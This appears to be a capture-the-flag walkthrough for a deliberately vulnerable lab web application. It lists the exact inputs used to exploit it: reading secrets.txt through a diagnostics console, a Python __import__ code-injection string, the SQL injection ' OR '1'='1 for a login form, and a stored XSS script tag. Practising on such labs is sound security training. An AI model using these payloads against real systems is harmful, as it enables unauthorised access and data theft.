#Launch Container
cd "<file directory>"
docker compose up

#Insecure Root Privlege Access
Press "Diagnostics" Button
issue command: ls
issue command: cat secrets.txt
Record flag value and keep hint in mind

#Arbitrary Program Execution
Press "Tools" Button
issue command: __import__('flagpage').get_flag_page()
Record flag value

#SQL Injection
Press "Customer Portal" button
For Username issue command: ' OR '1'='1
Password: "secureadmin123"
Record flag value

#Stored XSS Vulnerability
Press "Contact" button
Issue a command: <script>alert('Example of stored XSS in unsecure application')</script>
View the execution of the cross-site scripting injected command.
No flag value for this vulnerability